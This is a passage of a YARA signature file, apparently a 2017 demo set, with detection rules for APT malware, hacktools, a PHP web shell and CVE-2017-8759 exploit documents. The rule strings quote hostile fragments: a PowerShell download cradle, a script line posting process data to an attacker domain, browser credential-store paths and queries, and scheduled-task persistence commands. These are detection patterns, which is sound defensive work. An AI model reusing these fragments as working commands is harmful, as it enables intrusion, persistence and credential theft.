      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "e Class Descriptor at (" fullword ascii
      $s2 = ".?AVCAntiAntiAppleFrameRealClass@@" fullword ascii
      $s3 = ".?AVCAntiAntiAppleFrameBaseClass@@" fullword ascii
      $s4 = ".?AVCAppleBinRealClass@@" fullword ascii
      $s5 = ".?AVCAppleBinBaseClass@@" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 4 of them or pe.imphash ( ) == "897077ca318eaf629cfe74569f10e023" ) )
} 

rule Microcin_Sample_2_RID2D97 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "[Pause]" fullword ascii
      $s7 = "IconCache_%02d%02d%02d%02d%02d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule Microcin_Sample_3_RID2D98 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Users\\Lenovo\\Desktop\\test\\Release\\test.pdb" fullword ascii
      $s2 = "test, Version 1.0" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule Microcin_Sample_4_RID2D99 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd /c dir /a /s \"%s\" > \"%s\"" fullword wide
      $s2 = "ini.dat" fullword wide
      $s3 = "winupdata" fullword wide
      $f1 = "%s\\(%08x%08x)%s" fullword wide
      $f2 = "%s\\d%08x\\d%08x.db" fullword wide
      $f3 = "%s\\u%08x\\u%08x.db" fullword wide
      $f4 = "%s\\h%08x\\h%08x.db" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of ( $s* ) or 5 of them )
} 

rule Microcin_Sample_5_RID2D9A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Sorry, you are not fortuante ^_^, Please try other password dictionary " fullword ascii
      $x2 = "DomCrack <IP> <UserName> <Password_Dic file path> <option>" fullword ascii
      $x3 = "The password is \"%s\"         Time: %d(s)" fullword ascii
      $x4 = "The password is \" %s \"         Time: %d(s)" fullword ascii
      $x5 = "No password found!" fullword ascii
      $x7 = "Can not found the Password Dictoonary file! " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them ) or 2 of them
} 

rule Microcin_Sample_6_RID2D9B : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "** ERROR ** %s: %s" fullword ascii
      $s2 = "TEMPDATA" fullword wide
      $s3 = "Bruntime error " fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )
} 

rule Sharpire_RID2A4F : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file Sharpire_RID2A4F.exe"
      author = "Florian Roth"
      reference = "https://github.com/0xbadjuju/Sharpire_RID2A4F"
      date = "2017-09-23 05:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\obj\\Debug\\Sharpire_RID2A4F.pdb" fullword ascii
      $x2 = "[*] Upload of $fileName successful" fullword wide
      $s1 = "no shell command supplied" fullword wide
      $s2 = "/login/process.php" fullword wide
      $s3 = "invokeShellCommand" fullword ascii
      $s4 = "..Command execution completed." fullword wide
      $s5 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword wide
      $s6 = "/admin/get.php" fullword wide
      $s7 = "[!] Error in stopping job: " fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) and 3 of them ) )
} 

rule Invoke_Metasploit_RID2DFE : DEMO HKTL METASPLOIT T1105 T1136 {
   meta:
      description = "Detects Invoke-Metasploit Payload"
      author = "Florian Roth"
      reference = "https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1"
      date = "2017-09-23 10:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, METASPLOIT, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[*] Looks like we're 64bit, using regular powershell.exe" ascii wide
      $s2 = "[*] Kicking off download cradle in a new process" 
      $s3 = "Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'" 
   condition: 
      ( filesize < 20KB and 1 of them )
} 

rule ALFA_SHELL_RID29FC : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects web shell often used by Iranian APT groups"
      author = "Florian Roth"
      reference = "http://getalfa.rf.gd/?i=1"
      date = "2017-09-21 02:45:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')" ascii
      $x2 = "#solevisible@gmail.com" fullword ascii
      $x3 = "'login_page' => '500',//gui or 500 or 403 or 404" fullword ascii
      $x4 = "$GLOBALS['__ALFA__']" fullword ascii
      $x5 = "if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')" ascii
      $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A } 
   condition: 
      ( filesize < 900KB and 2 of ( $x* ) or $f1 at ( filesize - 22 ) )
} 

rule CVE_2017_8759_SOAP_Excel_RID2E36 : DEMO EXPLOIT OFFICE T1136 T1193 T1203 {
   meta:
      description = "Detects malicious files related to CVE-2017-8759"
      author = "Florian Roth"
      reference = "https://twitter.com/buffaloverflow/status/908455053345869825"
      date = "2017-09-15 11:04:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, OFFICE, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "|'soap:wsdl=" ascii wide nocase
   condition: 
      ( filesize < 300KB and 1 of them )
} 

rule CVE_2017_8759_Mal_HTA_RID2D09 : DEMO EXPLOIT FILE T1136 T1193 T1203 {
   meta:
      description = "Detects malicious files related to CVE-2017-8759 - file cmd.hta"
      author = "Florian Roth"
      reference = "https://github.com/Voulnet/CVE-2017-8759-Exploit-sample"
      date = "2017-09-14 10:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, FILE, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Error = Process.Create(\"powershell -nop cmd.exe /c" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x683c and filesize < 1KB and all of them )
} 

rule CVE_2017_8759_Mal_Doc_RID2D42 : DEMO EXPLOIT FILE T1136 T1193 T1203 {
   meta:
      description = "Detects malicious files related to CVE-2017-8759 - file Doc1.doc"
      author = "Florian Roth"
      reference = "https://github.com/Voulnet/CVE-2017-8759-Exploit-sample"
      date = "2017-09-14 10:24:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, FILE, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "soap:wsdl=http://" ascii wide nocase
      $s2 = "soap:wsdl=https://" ascii wide nocase
      $s3 = "soap:wsdl=http%3A%2F%2F" ascii wide nocase
      $s4 = "soap:wsdl=https%3A%2F%2F" ascii wide nocase
      $c1 = "Project.ThisDocument.AutoOpen" fullword wide
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 500KB and ( 1 of ( $s* ) and $c1 )
} 

rule CVE_2017_8759_SOAP_via_JS_RID2E81 : DEMO EXPLOIT T1136 {
   meta:
      description = "Detects SOAP WDSL Download via JavaScript"
      author = "Florian Roth"
      reference = "https://twitter.com/buffaloverflow/status/907728364278087680"
      date = "2017-09-14 11:17:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GetObject(\"soap:wsdl=https://" ascii wide nocase
      $s2 = "GetObject(\"soap:wsdl=http://" ascii wide nocase
   condition: 
      ( filesize < 3KB and 1 of them )
} 

rule CVE_2017_8759_SOAP_txt_RID2DA5 : DEMO EXPLOIT T1193 T1203 {
   meta:
      description = "Detects malicious file in releation with CVE-2017-8759 - file exploit.txt"
      author = "Florian Roth"
      reference = "https://github.com/Voulnet/CVE-2017-8759-Exploit-sample"
      date = "2017-09-14 10:40:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, T1193, T1203"
      minimum_yara = "2.2.0"
      
   strings:
      $s1 = /<soap:address location="http[s]?:\/\/[^"]{8,140}.hta"/ ascii wide
      $s2 = /<soap:address location="http[s]?:\/\/[^"]{8,140}mshta.exe"/ ascii wide
   condition: 
      ( filesize < 200KB and 1 of them )
} 

rule Unspecified_Malware_Sep1_A1_RID3131 : DEMO EXE FILE MAL {
   meta:
      description = "Detects malware from DrqgonFly APT report"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group"
      date = "2017-09-12 13:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and pe.imphash ( ) == "17a4bd9c95f2898add97f309fc6f9bcd" )
} 

rule DragonFly_APT_Sep17_1_RID2E5A : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from DrqgonFly APT report"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group"
      date = "2017-09-12 11:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Update\\Temp\\ufiles.txt" fullword wide
      $s2 = "%02d.%02d.%04d %02d:%02d" fullword wide
      $s3 = "*pass*.*" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
} 

rule DragonFly_APT_Sep17_2_RID2E5B : APT DEMO EXE FILE MAL T1003 T1136 {
   meta:
      description = "Detects malware from DrqgonFly APT report"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group"
      date = "2017-09-12 11:11:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data" fullword wide
      $s2 = "C:\\Users\\Public\\Log.txt" fullword wide
      $s3 = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins" fullword wide
      $s4 = "***************** Mozilla Firefox ****************" fullword wide
      $s5 = "********************** Opera *********************" fullword wide
      $s6 = "\\AppData\\Local\\Microsoft\\Credentials\\" fullword wide
      $s7 = "\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\" fullword wide
      $s8 = "**************** Internet Explorer ***************" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 3 of them )
} 

rule DragonFly_APT_Sep17_3_RID2E5C : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from DrqgonFly APT report"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group"
      date = "2017-09-12 11:11:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "kernel64.dll" fullword ascii
      $s2 = "ws2_32.dQH" fullword ascii
      $s3 = "HGFEDCBADCBA" fullword ascii
      $s4 = "AWAVAUATWVSU" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( pe.imphash ( ) == "6f03fb864ff388bac8680ac5303584be" or all of them ) )
} 

rule DragonFly_APT_Sep17_4_RID2E5D : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from DrqgonFly APT report"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group"
      date = "2017-09-12 11:11:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "screen.exe" fullword wide
      $s2 = "PlatformInvokeUSER32" fullword ascii
      $s3 = "GetDesktopImageF" fullword ascii
      $s4 = "PlatformInvokeGDI32" fullword ascii
      $s5 = "GetDesktopImage" fullword ascii
      $s6 = "Too many arguments, going to store in current dir" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )
} 

rule Monsoon_APT_Malware_1_RID2EF6 : APT DEMO EXE FILE G0040 G0042 MAL T1136 {
   meta:
      description = "Detects malware from Monsoon APT"
      author = "Florian Roth"
      reference = "http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2"
      date = "2017-09-08 11:36:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0040, G0042, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "cmd.exe /c start " fullword ascii
      $s2 = "\\Microsoft\\Templates\\" fullword ascii
      $s3 = "\\Microsoft\\Windows\\" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "a0c824244f1d36ea1dd2759cf7599cd1" or all of them ) )
} 

rule Monsoon_APT_Malware_2_RID2EF7 : APT DEMO EXE FILE G0040 G0042 MAL T1136 {
   meta:
      description = "Detects malware from Monsoon APT"
      author = "Florian Roth"
      reference = "http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2"
      date = "2017-09-08 11:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0040, G0042, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Microsoft\\Windows\\coco.exe" fullword ascii
      $x2 = ":\\System Volume Information\\config" fullword ascii
      $x3 = " cscript.[BACKSPA[PAGE DO[CAPS LO[PAGE UPTPX498.dTPX499.d" fullword wide
      $s1 = "\\Microsoft\\Templates\\msvcrt.dll" fullword ascii
      $s2 = "%04d/%02d/%02d %02d:%02d:%02d - {%s}" fullword wide
      $s3 = "wininet.dll    " fullword ascii
      $s4 = "DMCZ0001.dat" fullword ascii
      $s5 = "TZ0000001.dat" fullword ascii
      $s6 = "\\MUT.dat" fullword ascii
      $s7 = "ouemm/emm!!!!!!!!!!!!!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 3 of them ) )
} 

rule Rehashed_RAT_2_RID2C0C : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Rehashed RAT incident"
      author = "Florian Roth"
      reference = "https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations"
      date = "2017-09-08 09:32:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "dalat.dulichovietnam.net" fullword ascii
      $x2 = "web.Thoitietvietnam.org" fullword ascii
      $a1 = "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64)" fullword ascii
      $a2 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3" ascii
      $s1 = "GET /%s%s%s%s HTTP/1.1" fullword ascii
      $s2 = "http://%s:%d/%s%s%s%s" fullword ascii
      $s3 = "{521338B8-3378-58F7-AFB9-E7D35E683BF8}" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "9c4c648f4a758cbbfe28c8850d82f931" or ( 1 of ( $x* ) or 3 of them ) ) ) or ( 4 of them )
} 

rule Rehashed_RAT_3_RID2C0D : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Rehashed RAT incident"
      author = "Florian Roth"
      reference = "https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations"
      date = "2017-09-08 09:32:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\BisonNewHNStubDll\\Release\\Goopdate.pdb" fullword ascii
      $s2 = "psisrndrx.ebd" fullword wide
      $s3 = "pbad exception" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 2 of them )
} 

rule KHRAT_Malware_RID2BB3 : DEMO EXE FILE MAL {
   meta:
      description = "Detects an Imphash of KHRAT malware"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/"
      date = "2017-08-31 09:17:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == "6a8478ad861f98f8428a042f74de1944"
} 

rule MAL_KHRAT_script_RID2CB8 : DEMO MAL T1053 T1085 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file MAL_KHRAT_scritpt.js"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/"
      date = "2017-08-31 10:01:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1053, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "CreateObject(\"WScript.Shell\").Run \"schtasks /create /sc MINUTE /tn" ascii
      $x2 = "CreateObject(\"WScript.Shell\").Run \"rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication" ascii
      $x3 = "<registration progid=\"ff010f\" classid=\"{e934870c-b429-4d0d-acf1-eef338b92c4b}\" >" fullword ascii
   condition: 
      1 of them
} 

rule MAL_KHRAT_scritplet_RID2DFD : DEMO FILE MAL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file MAL_KHRAT_scritplet_RID2DFD.sct"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/"
      date = "2017-08-31 10:55:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "http.open \"POST\", \"http://update.upload-dropbox[.]com/docs/tz/GetProcess.php\",False,\"\",\"\" " fullword ascii
      $x2 = "Process=Process & Chr(32) & Chr(32) & Chr(32) & Obj.Description" fullword ascii
      $s1 = "http.SetRequestHeader \"Content-Type\", \"application/json\" " fullword ascii
      $s2 = "Dim http,WMI,Objs,Process" fullword ascii
      $s3 = "Set Objs=WMI.InstancesOf(\"Win32_Process\")" fullword ascii
      $s4 = "'WScript.Echo http.responseText " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 1KB and ( 1 of ( $x* ) or 4 of them )
} 

rule APT12_Malware_Aug17_RID2D65 : DEMO EXE FILE G0005 MAL {
   meta:
      description = "Detects APT 12 Malware"
      author = "Florian Roth"
      reference = "http://blog.macnica.net/blog/2017/08/post-fb81.html"
      date = "2017-08-30 10:30:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0005, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == "9ba915fd04f248ad62e856c7238c0264" )
} 

rule KeeThief_PS_RID2B18 : DEMO FILE HKTL T1086 T1136 {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file KeeThief.ps1"
      author = "Florian Roth"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29 08:51:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$WMIProcess = Get-WmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"" fullword ascii
      $x2 = "if($KeePassProcess.FileVersion -match '^2\\.') {" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7223 and filesize < 1000KB and ( 1 of ( $x* ) ) )
} 

rule KeeTheft_EXE_RID2B62 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file KeeTheft.exe"
      author = "Florian Roth"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29 09:04:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Error: Could not create a thread for the shellcode" fullword wide
      $x2 = "Could not find address marker in shellcode" fullword wide
      $x3 = "GenerateDecryptionShellCode" fullword ascii
      $x4 = "KeePassLib.Keys.KcpPassword" fullword wide
      $x5 = "************ Found a CompositeKey! **********" fullword wide
      $x6 = "*** Interesting... there are multiple .NET runtimes loaded in KeePass" fullword wide
      $x7 = "GetKcpPasswordInfo" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule KeeTheft_Out_Shellcode_RID2FAA : DEMO HKTL T1086 T1136 {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file Out-Shellcode.ps1"
      author = "Florian Roth"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29 12:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Write-Host \"Shellcode length: 0x$(($ShellcodeLength + 1).ToString('X4'))\"" fullword ascii
      $x2 = "$TextSectionInfo = @($MapContents | Where-Object { $_ -match '\\.text\\W+CODE' })[0]" fullword ascii
   condition: 
      ( filesize < 2KB and 1 of them )
} 

rule Hacktool_PasswordsPro_RID2F9C : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file PasswordsPro.exe"
      author = "Florian Roth"
      reference = "PasswordPro"
      date = "2017-08-27 12:04:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "No users marked for attack or all marked users already have passwords found!" fullword ascii
      $s2 = "%s\\PasswordsPro.ini.Dictionaries(%d)" fullword ascii
      $s3 = "Passwords processed since attack start:" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )
} 

rule PasswordPro_NTLM_DLL_RID2E6A : DEMO EXE FILE HKTL T1076 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file NTLM.dll"
      author = "Florian Roth"
      reference = "PasswordPro"
      date = "2017-08-27 11:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1076, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "NTLM.dll" fullword ascii
      $s2 = "Algorithm: NTLM" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and pe.exports ( "GetHash" ) and pe.exports ( "GetInfo" ) and ( all of them ) )
} 

rule JavaScript_Run_Suspicious_RID3132 : DEMO SCRIPT T1064 T1136 {
   meta:
      description = "Detects a suspicious Javascript Run command"
      author = "Florian Roth"
      reference = "https://twitter.com/craiu/status/900314063560998912"
      date = "2017-08-23 13:12:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "w = new ActiveXObject(" ascii
      $s2 = " w.Run(r);" fullword ascii
   condition: 
      all of them
} 

rule Datper_Backdoor_RID2CF5 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Datper Malware"
      author = "Florian Roth"
      reference = "http://blog.jpcert.or.jp/2017/08/detecting-datper-malware-from-proxy-logs.html"
      date = "2017-08-21 10:11:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "RtlGetCo" fullword ascii
      $s2 = "hutils" fullword ascii
      $s3 = "kza2FWU,f;\"3U&zpa3U(W`J" fullword ascii
      $c1 = "dkkwldngn" fullword ascii
      $c2 = "ndkkwqgcm" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "58db98e2334746d349d607e4d73bc5ea" or pe.imphash ( ) == "8fbed921458af485ce84fb7d9b13899e" or ( 2 of ( $s* ) and 1 of ( $c* ) ) or ( $s3 and $c1 ) ) )
} 

rule Suspicious_Script_Running_from_HTTP_RID350E : DEMO SCRIPT T1064 T1136 {
   meta:
      description = "Detects a suspicious "
      author = "Florian Roth"
      reference = "https://www.hybrid-analysis.com/sample/a112274e109c5819d54aa8de89b0e707b243f4929a83e77439e3ff01ed218a35?environmentId=100"
      date = "2017-08-20 15:56:51"
      score = 50
      customer = "demo"
